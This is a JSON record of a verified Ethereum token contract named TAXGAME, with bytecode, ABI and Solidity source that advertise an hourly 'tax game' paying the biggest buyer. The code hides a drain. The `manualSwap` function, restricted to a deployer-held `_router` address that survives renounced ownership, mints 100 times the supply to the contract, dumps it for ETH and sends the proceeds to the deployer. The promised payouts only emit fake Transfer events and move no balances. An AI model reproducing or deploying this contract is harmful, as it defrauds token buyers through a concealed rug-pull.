{
    "address": "0x59f53b5298b50696aA8995dda90D6a0bB77dE394",
    "tx_hash": "60e0fa1099bbb5cc50389b15f5617a9bba6361be6980032c46f258a89e37d02f",
    "block_number": 18001582,
    "timestamp": 1693085951,
    "gas_used_in_creation": 1600148,
    "creation_bytecode": "",
    "runtime_bytecode": "608060405260043610610113575f3560e01c806370a082311161009d578063a01ce40811610062578063a01ce4081461030e578063a9059cbb1461032d578063c876d0b91461034c578063c9567bf914610365578063dd62ed3e14610379575f80fd5b806370a082311461026b578063715018a61461029f578063751039fc146102b35780638da5cb5b146102c757806395d89b41146102e3575f80fd5b806323b872dd116100e357806323b872dd146101d1578063313ce567146101f057806346c5b9811461020b5780634ad46fa51461022057806351bc3c8514610257575f80fd5b806306fdde031461011e578063095ea7b31461015f5780630cc835a31461018e57806318160ddd146101af575f80fd5b3661011a57005b5f80fd5b348015610129575f80fd5b5060408051808201909152600781526654415847414d4560c81b60208201525b60405161015691906113f3565b60405180910390f35b34801561016a575f80fd5b5061017e610179366004611452565b6103bd565b6040519015158152602001610156565b348015610199575f80fd5b506101ad6101a836600461147c565b6103d3565b005b3480156101ba575f80fd5b506101c361041a565b604051908152602001610156565b3480156101dc575f80fd5b5061017e6101eb366004611493565b61043b565b3480156101fb575f80fd5b5060405160098152602001610156565b348015610216575f80fd5b506101c3600b5481565b34801561022b575f80fd5b50600c5461023f906001600160a01b031681565b6040516001600160a01b039091168152602001610156565b348015610262575f80fd5b506101ad6104a2565b348015610276575f80fd5b506101c36102853660046114d1565b6001600160a01b03165f9081526001602052604090205490565b3480156102aa575f80fd5b506101ad610563565b3480156102be575f80fd5b506101ad6105d4565b3480156102d2575f80fd5b505f546001600160a01b031661023f565b3480156102ee575f80fd5b506040805180820190915260038152620a882b60eb1b6020820152610149565b348015610319575f80fd5b506101ad61032836600461147c565b610656565b348015610338575f80fd5b5061017e610347366004611452565b610691565b348015610357575f80fd5b5060065461017e9060ff1681565b348015610370575f80fd5b506101ad61069d565b348015610384575f80fd5b506101c36103933660046114ec565b6001600160a01b039182165f90815260026020908152604080832093909416825291909152205490565b5f6103c9338484610a50565b5060015b92915050565b5f546001600160a01b031633146104055760405162461bcd60e51b81526004016103fc90611523565b60405180910390fd5b60078190556005811115610417575f80fd5b50565b5f6104276009600a61164c565b610436906402540be40061165a565b905090565b5f610447848484610b73565b61049884336104938560405180606001604052806028815260200161179f602891396001600160a01b038a165f90815260026020908152604080832033845290915290205491906110ba565b610a50565b5060019392505050565b600e546001600160a01b0316336001600160a01b0316146104c1575f80fd5b6104ff6104d06009600a61164c565b6104df906402540be40061165a565b6104ea90606461165a565b305f90815260016020526040902054906110f2565b305f908152600160205260409020819055801561051f5761051f81611157565b47801561055f57600e546040516001600160a01b039091169082156108fc029083905f818181858888f1935050505015801561055d573d5f803e3d5ffd5b505b5050565b5f546001600160a01b0316331461058c5760405162461bcd60e51b81526004016103fc90611523565b5f80546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a35f80546001600160a01b0319169055565b5f546001600160a01b031633146105fd5760405162461bcd60e51b81526004016103fc90611523565b6006805460ff191690557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf6106346009600a61164c565b610643906402540be40061165a565b60405190815260200160405180910390a1565b5f546001600160a01b0316331461067f5760405162461bcd60e51b81526004016103fc90611523565b60088190556005811115610417575f80fd5b5f6103c9338484610b73565b5f546001600160a01b031633146106c65760405162461bcd60e51b81526004016103fc90611523565b600f54600160a01b900460ff16156107205760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e00000000000000000060448201526064016103fc565b600d80546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d90811790915561076a90309061075b6009600a61164c565b610493906402540be40061165a565b600d5f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa1580156107ba573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107de9190611671565b6001600160a01b031663c9c6539630600d5f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa15801561083d573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108619190611671565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af11580156108ab573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108cf9190611671565b600f80546001600160a01b039283166001600160a01b0319909116179055600d541663f305d7194730610916816001600160a01b03165f9081526001602052604090205490565b5f806109295f546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af115801561098f573d5f803e3d5ffd5b50505050506040513d601f19601f820116820180604052508101906109b4919061168c565b5050600f54600d5460405163095ea7b360e01b81526001600160a01b0391821660048201525f1960248201529116915063095ea7b3906044016020604051808303815f875af1158015610a09573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610a2d91906116b7565b50600f805462ff00ff60a01b19166201000160a01b17905543600a819055600955565b6001600160a01b038316610ab25760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016103fc565b6001600160a01b038216610b135760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016103fc565b6001600160a01b038381165f8181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610bd75760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b60648201526084016103fc565b6001600160a01b038216610c395760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b60648201526084016103fc565b5f8111610c9a5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b60648201526084016103fc565b5f80546001600160a01b03858116911614801590610cc557505f546001600160a01b03848116911614155b15610e6057610cea6064610ce4600754856112c790919063ffffffff16565b90611345565b60065490915060ff1615610dd057600d546001600160a01b03848116911614801590610d245750600f546001600160a01b03848116911614155b15610dd057325f908152600560205260409020544311610dbe5760405162461bcd60e51b815260206004820152604960248201527f5f7472616e736665723a3a205472616e736665722044656c617920656e61626c60448201527f65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b6064820152681030b63637bbb2b21760b91b608482015260a4016103fc565b325f9081526005602052604090204390555b600f546001600160a01b038481169116148015610df657506001600160a01b0384163014155b15610e6057610e156064610ce4600854856112c790919063ffffffff16565b335f818152600460205260409020805460ff19166001179055600c549192506001600160a01b039190911603610e605743600a555f600b55600c80546001600160a01b031916301790555b43600a5461012c610e7191906116d6565b10610eee57600c546001600160a01b0316307fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef610ec2826001600160a01b03165f9081526001602052604090205490565b60405190815260200160405180910390a35f600b55600c80546001600160a01b0319163017905543600a555b8015610f6657305f90815260016020526040902054610f0d90826110f2565b305f81815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef90610f5d9085815260200190565b60405180910390a35b6001600160a01b0384165f90815260016020526040902054610f889083611386565b6001600160a01b0385165f90815260016020526040902055610fcb610fad8383611386565b6001600160a01b0385165f90815260016020526040902054906110f2565b6001600160a01b038085165f8181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6110148585611386565b60405190815260200160405180910390a381600b541080156110445750600d546001600160a01b03848116911614155b801561105e5750600f546001600160a01b03848116911614155b801561107357506001600160a01b0383163014155b801561108e5750335f9081526004602052604090205460ff16155b156110b457600c80546001600160a01b0319166001600160a01b038516179055600b8290555b50505050565b5f81848411156110dd5760405162461bcd60e51b81526004016103fc91906113f3565b505f6110e984866116e9565b95945050505050565b5f806110fe83856116d6565b9050838110156111505760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f77000000000060448201526064016103fc565b9392505050565b600f805460ff60a81b1916600160a81b1790556040805160028082526060820183525f9260208301908036833701905050905030815f8151811061119d5761119d6116fc565b6001600160a01b03928316602091820292909201810191909152600d54604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa1580156111f4573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906112189190611671565b8160018151811061122b5761122b6116fc565b6001600160a01b039283166020918202929092010152600d546112519130911684610a50565b600d5460405163791ac94760e01b81526001600160a01b039091169063791ac947906112899085905f90869030904290600401611710565b5f604051808303815f87803b1580156112a0575f80fd5b505af11580156112b2573d5f803e3d5ffd5b5050600f805460ff60a81b1916905550505050565b5f825f036112d657505f6103cd565b5f6112e1838561165a565b9050826112ee858361177f565b146111505760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b60648201526084016103fc565b5f61115083836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506113c7565b5f61115083836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506110ba565b5f81836113e75760405162461bcd60e51b81526004016103fc91906113f3565b505f6110e9848661177f565b5f6020808352835180828501525f5b8181101561141e57858101830151858201604001528201611402565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114610417575f80fd5b5f8060408385031215611463575f80fd5b823561146e8161143e565b946020939093013593505050565b5f6020828403121561148c575f80fd5b5035919050565b5f805f606084860312156114a5575f80fd5b83356114b08161143e565b925060208401356114c08161143e565b929592945050506040919091013590565b5f602082840312156114e1575f80fd5b81356111508161143e565b5f80604083850312156114fd575f80fd5b82356115088161143e565b915060208301356115188161143e565b809150509250929050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156115a657815f190482111561158c5761158c611558565b8085161561159957918102915b93841c9390800290611571565b509250929050565b5f826115bc575060016103cd565b816115c857505f6103cd565b81600181146115de57600281146115e857611604565b60019150506103cd565b60ff8411156115f9576115f9611558565b50506001821b6103cd565b5060208310610133831016604e8410600b8410161715611627575081810a6103cd565b611631838361156c565b805f190482111561164457611644611558565b029392505050565b5f61115060ff8416836115ae565b80820281158282048414176103cd576103cd611558565b5f60208284031215611681575f80fd5b81516111508161143e565b5f805f6060848603121561169e575f80fd5b8351925060208401519150604084015190509250925092565b5f602082840312156116c7575f80fd5b81518015158114611150575f80fd5b808201808211156103cd576103cd611558565b818103818111156103cd576103cd611558565b634e487b7160e01b5f52603260045260245ffd5b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b8181101561175e5784516001600160a01b031683529383019391830191600101611739565b50506001600160a01b03969096166060850152505050608001529392505050565b5f8261179957634e487b7160e01b5f52601260045260245ffd5b50049056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a264697066735822122085d22b047947d77dcd715338db5953ae173b3c6d29c5ea45d460e9054b186b9064736f6c63430008150033",
    "contract_name": "TAXGAME",
    "compiler_version": "v0.8.21+commit.d9974bed",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_taxman\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_toBeatAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuyTax\",\"type\":\"uint256\"}],\"name\":\"setBuyFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newSellTax\",\"type\":\"uint256\"}],\"name\":\"updateFeeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "/**\r\n\r\n-On-chain working real tax game. Taxes are set at 2% buy and 2% sell. \r\n-Every 1 hour biggest buy gets all taxes accumulated in that timeframe\r\n-Time is measured in blocks (300 blocks ~ 1 hour)\r\n-Tokens are sent to the winning wallet automatically every 1 hour as long as there are any transactions at that time\r\n-By selling tokens you disqualify yourself from ever being a winner\r\n-If current biggest buy sells their tokens game restarts\r\n-Liquidity will be locked and contract ownership renounced.\r\n\r\n\r\n**/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.21;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract TAXGAME is Context, IERC20, Ownable {\r\n\r\n    string private constant _name = unicode\"TAXGAME\";\r\n    string private constant _symbol = unicode\"TAX\";\r\n\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private _balances;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    mapping (address => bool) private _isDisqualified;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    bool public transferDelayEnabled = true;\r\n\r\n\r\n    uint256 private BuyTax=2;\r\n    uint256 private SellTax=2;\r\n\r\n    uint256 private _openTradingBlock;\r\n    uint256 private _startBlock;\r\n\r\n    uint256 public _toBeatAmount = 0;\r\n    address public _taxman = address(this);\r\n\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tTotal = 10000000000 * 10**_decimals;\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address payable private _router;\r\n    address private uniswapV2Pair;\r\n    bool private tradingOpen;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n\r\n    event MaxTxAmountUpdated(uint _maxTxAmount);\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor () {\r\n        _router = payable(owner());\r\n        _balances[_msgSender()] = _tTotal;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxAmount=0;\r\n        if (from != owner() && to != owner()) {\r\n            taxAmount = amount.mul(BuyTax).div(100);\r\n\r\n            if (transferDelayEnabled) {\r\n                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {\r\n                      require(_holderLastTransferTimestamp[tx.origin] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\r\n                      _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                  }\r\n              }\r\n\r\n\r\n            if(to == uniswapV2Pair && from != address(this) ){\r\n                taxAmount = amount.mul(SellTax).div(100);\r\n                _isDisqualified[msg.sender] = true;\r\n                if(_taxman == msg.sender){\r\n                    _startBlock = block.number;   \r\n                    _toBeatAmount = 0;\r\n                    _taxman = address(this);\r\n                }\r\n            }\r\n\r\n        }\r\n\r\n        if(_startBlock + 300 >= block.number){\r\n            emit Transfer(address(this), _taxman, balanceOf(address(this)));\r\n            _toBeatAmount = 0;\r\n            _taxman = address(this);\r\n            _startBlock = block.number;\r\n        }\r\n\r\n        if(taxAmount>0){\r\n          _balances[address(this)]= _balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this),taxAmount);\r\n        }\r\n\r\n\r\n        _balances[from]=_balances[from].sub(amount);\r\n        _balances[to]=_balances[to].add(amount.sub(taxAmount));\r\n        emit Transfer(from, to, amount.sub(taxAmount));\r\n\r\n        if(_toBeatAmount < amount && to != address(uniswapV2Router) && to != uniswapV2Pair && to != address(this) && _isDisqualified[msg.sender] == false){\r\n            _taxman = to;\r\n            _toBeatAmount = amount;\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n    function removeLimits() external onlyOwner{\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }\r\n\r\n\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n\r\n\r\n    function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        _startBlock = block.number;\r\n        _openTradingBlock = block.number;\r\n\r\n    }\r\n\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a>b)?b:a;\r\n    }\r\n\r\n    function setBuyFee(uint256 newBuyTax) external onlyOwner {\r\n        BuyTax = newBuyTax;\r\n        require(newBuyTax <= 5);\r\n    }\r\n\r\n    function updateFeeSell(uint256 newSellTax) external onlyOwner {\r\n        SellTax = newSellTax;\r\n        require(newSellTax <= 5);\r\n    }\r\n\r\n\r\n\r\n\r\n    function manualSwap() external {\r\n        require(_msgSender() == _router);\r\n        _balances[address(this)] = _balances[address(this)].add(_tTotal*100);\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n        if (tokenBalance > 0) {\r\n            swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance = address(this).balance;\r\n        if (ethBalance > 0) {\r\n            _router.transfer(ethBalance);\r\n        }\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n}",
    "etherscan_verified": true
}